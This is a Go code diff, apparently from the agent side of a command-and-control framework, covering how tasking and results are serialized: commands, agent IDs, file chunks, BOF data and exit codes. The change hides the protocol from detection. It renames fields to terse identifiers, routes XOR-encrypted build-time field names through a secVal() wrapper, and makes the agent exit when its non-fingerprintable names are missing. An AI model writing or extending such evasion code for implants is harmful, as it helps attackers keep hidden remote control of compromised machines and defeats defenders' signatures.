@@ -12,14 +12,14 @@ import (
 // JSON field names - injected at build time via ldflags (XOR encrypted)
 // These are decrypted in getEnv.go init()
 var (
-	// Command/Response fields
-	jfCT string // CommandType
-	jfCO string // Command
-	jfCI string // CommandID
-	jfCB string // CommandDBID
-	jfAI string // AgentID
+	// Msg/Response fields
+	jfCT string // CT
+	jfCO string // Msg
+	jfCI string // CID
+	jfCB string // DID
+	jfAI string // AID
 	jfFN string // Filename
-	jfOF string // OriginalFilename
+	jfOF string // OFN
 	jfRP string // RemotePath
 	jfCC string // CurrentChunk
 	jfTC string // TotalChunks
@@ -28,7 +28,7 @@ var (
 	jfTS string // Timestamp
 	jfJI string // JobID
 	jfOU string // Output
-	jfEC string // ExitCode
+	jfEC string // EC
 	jfER string // Error
 
 	// Template fields (used for server templates)
@@ -41,70 +41,69 @@ var (
 	jfBD string // BOFData
 	jfCD string // ChunkData
 
-	// Handshake/SystemInfo fields
+	// Handshake fields
 	jfST string // Status
-	jfNC string // NewClientID
-	jfSI string // SecretsInitialized
+	jfNC string // NNID
+	jfSI string // SInit
 	jfSG string // Signature
 	jfSD string // Seed
-	jfCT2 string // CommsTemplate (ct is taken, use ct2)
-	jfET string // ExecReqTemplate
+	jfCT2 string // PCfg (ct is taken, use ct2)
+	jfET string // RunCfg
 	jfMD string // Metadata
 )
 
-// MarshalJSON implements custom JSON marshaling for CommandResponse
+// MarshalJSON implements custom JSON marshaling for OpResp
 // Uses dynamically-injected field names instead of struct tags
-func (r *CommandResponse) MarshalJSON() ([]byte, error) {
+func (r *OpResp) MarshalJSON() ([]byte, error) {
 	m := make(map[string]interface{})
 
-	// Only include non-empty fields
-	if r.Command != "" {
-		m[jfCO] = r.Command
+	if r.Cmd != "" {
+		m[secVal(jfCO)] = r.Cmd
 	}
-	if r.CommandID != "" {
-		m[jfCI] = r.CommandID
+	if r.CID != "" {
+		m[secVal(jfCI)] = r.CID
 	}
-	if r.CommandDBID != 0 {
-		m[jfCB] = r.CommandDBID
+	if r.DID != 0 {
+		m[secVal(jfCB)] = r.DID
 	}
-	if r.AgentID != "" {
-		m[jfAI] = r.AgentID
+	if r.AID != "" {
+		m[secVal(jfAI)] = r.AID
 	}
 	if r.Filename != "" {
-		m[jfFN] = r.Filename
+		m[secVal(jfFN)] = r.Filename
 	}
 	if r.RemotePath != "" {
-		m[jfRP] = r.RemotePath
+		m[secVal(jfRP)] = r.RemotePath
 	}
 	if r.CurrentChunk != 0 {
-		m[jfCC] = r.CurrentChunk
+		m[secVal(jfCC)] = r.CurrentChunk
 	}
 	if r.TotalChunks != 0 {
-		m[jfTC] = r.TotalChunks
+		m[secVal(jfTC)] = r.TotalChunks
 	}
 	if r.Data != "" {
-		m[jfDA] = r.Data
+		m[secVal(jfDA)] = r.Data
 	}
 	if r.Output != "" {
-		m[jfOU] = r.Output
+		m[secVal(jfOU)] = r.Output
 	}
 	if r.Error != "" {
-		m[jfER] = r.Error
+		m[secVal(jfER)] = r.Error
 	}
-	m[jfEC] = r.ExitCode
+	m[secVal(jfEC)] = r.EC
 	if r.Timestamp != "" {
-		m[jfTS] = r.Timestamp
+		m[secVal(jfTS)] = r.Timestamp
 	}
 	if r.JobID != "" {
-		m[jfJI] = r.JobID
+		m[secVal(jfJI)] = r.JobID
 	}
 
 	return json.Marshal(m)
 }
 
-// UnmarshalJSON implements custom JSON unmarshaling for Command
+// UnmarshalJSON implements custom JSON unmarshaling for Msg
 // Accepts dynamically-injected field names
-func (c *Command) UnmarshalJSON(data []byte) error {
+func (c *Msg) UnmarshalJSON(data []byte) error {
 	var raw map[string]interface{}
 	if err := json.Unmarshal(data, &raw); err != nil {
 		return err
@@ -129,20 +128,20 @@ func (c *Command) UnmarshalJSON(data []byte) error {
 	}
 
 	// Parse with dynamic field names (try injected first, then fallback to hardcoded)
-	c.CommandType = getInt(jfCT, "ct")
-	c.Command = getString(jfCO, "co")
-	c.CommandID = getString(jfCI, "ci")
-	c.CommandDBID = getInt(jfCB, "cb")
-	c.AgentID = getString(jfAI, "ai")
-	c.Filename = getString(jfFN, "fn")
-	c.OriginalFilename = getString(jfOF, "of")
-	c.RemotePath = getString(jfRP, "rp")
-	c.CurrentChunk = getInt(jfCC, "cc")
-	c.TotalChunks = getInt(jfTC, "tc")
-	c.Data = getString(jfDA, "data")
-	c.Arguments = getString(jfAR, "ar")
-	c.Timestamp = getString(jfTS, "ts")
-	c.JobID = getString(jfJI, "ji")
+	c.CT = getInt(secVal(jfCT), "ct")
+	c.Cmd = getString(secVal(jfCO), "co")
+	c.CID = getString(secVal(jfCI), "ci")
+	c.DID = getInt(secVal(jfCB), "cb")
+	c.AID = getString(secVal(jfAI), "ai")
+	c.Filename = getString(secVal(jfFN), "fn")
+	c.OFN = getString(secVal(jfOF), "of")
+	c.RemotePath = getString(secVal(jfRP), "rp")
+	c.CurrentChunk = getInt(secVal(jfCC), "cc")
+	c.TotalChunks = getInt(secVal(jfTC), "tc")
+	c.Data = getString(secVal(jfDA), "data")
+	c.Arguments = getString(secVal(jfAR), "ar")
+	c.Timestamp = getString(secVal(jfTS), "ts")
+	c.JobID = getString(secVal(jfJI), "ji")
 
 	return nil
 }
@@ -152,23 +151,23 @@ func (c *Command) UnmarshalJSON(data []byte) error {
 // Maps randomized field names (keys) to standard field names (values)
 func GetJSONFieldMapping() map[string]string {
 	return map[string]string{
-		jfCT: "ct",
-		jfCO: "co",
-		jfCI: "ci",
-		jfCB: "cb",
-		jfAI: "ai",
-		jfFN: "fn",
-		jfOF: "of",
-		jfRP: "rp",
-		jfCC: "cc",
-		jfTC: "tc",
-		jfDA: "data",
-		jfAR: "ar",
-		jfTS: "ts",
-		jfJI: "ji",
-		jfOU: "ou",
-		jfEC: "ec",
-		jfER: "error",
+		secVal(jfCT): "ct",
+		secVal(jfCO): "co",
+		secVal(jfCI): "ci",
+		secVal(jfCB): "cb",
+		secVal(jfAI): "ai",
+		secVal(jfFN): "fn",
+		secVal(jfOF): "of",
+		secVal(jfRP): "rp",
+		secVal(jfCC): "cc",
+		secVal(jfTC): "tc",
+		secVal(jfDA): "data",
+		secVal(jfAR): "ar",
+		secVal(jfTS): "ts",
+		secVal(jfJI): "ji",
+		secVal(jfOU): "ou",
+		secVal(jfEC): "ec",
+		secVal(jfER): "error",
 	}
 }
 
@@ -177,14 +176,14 @@ func GetJSONFieldMapping() map[string]string {
 // Called from init() in getEnv.go after decryption.
 func initJSONFields() {
 	// Validate all fields were injected - no fallbacks to fingerprintable defaults
-	if jfCT == "" || jfCO == "" || jfCI == "" || jfCB == "" ||
-		jfAI == "" || jfFN == "" || jfOF == "" || jfRP == "" ||
-		jfCC == "" || jfTC == "" || jfDA == "" || jfAR == "" ||
-		jfTS == "" || jfJI == "" || jfOU == "" || jfEC == "" ||
-		jfER == "" || jfV == "" || jfT == "" || jfTPL == "" ||
-		jfP == "" || jfBD == "" || jfCD == "" || jfST == "" ||
-		jfNC == "" || jfSI == "" || jfSG == "" || jfSD == "" ||
-		jfCT2 == "" || jfET == "" || jfMD == "" {
+	if secVal(jfCT) == "" || secVal(jfCO) == "" || secVal(jfCI) == "" || secVal(jfCB) == "" ||
+		secVal(jfAI) == "" || secVal(jfFN) == "" || secVal(jfOF) == "" || secVal(jfRP) == "" ||
+		secVal(jfCC) == "" || secVal(jfTC) == "" || secVal(jfDA) == "" || secVal(jfAR) == "" ||
+		secVal(jfTS) == "" || secVal(jfJI) == "" || secVal(jfOU) == "" || secVal(jfEC) == "" ||
+		secVal(jfER) == "" || secVal(jfV) == "" || secVal(jfT) == "" || secVal(jfTPL) == "" ||
+		secVal(jfP) == "" || secVal(jfBD) == "" || secVal(jfCD) == "" || secVal(jfST) == "" ||
+		secVal(jfNC) == "" || secVal(jfSI) == "" || secVal(jfSG) == "" || secVal(jfSD) == "" ||
+		secVal(jfCT2) == "" || secVal(jfET) == "" || secVal(jfMD) == "" {
 		os.Exit(1)
 	}
 }
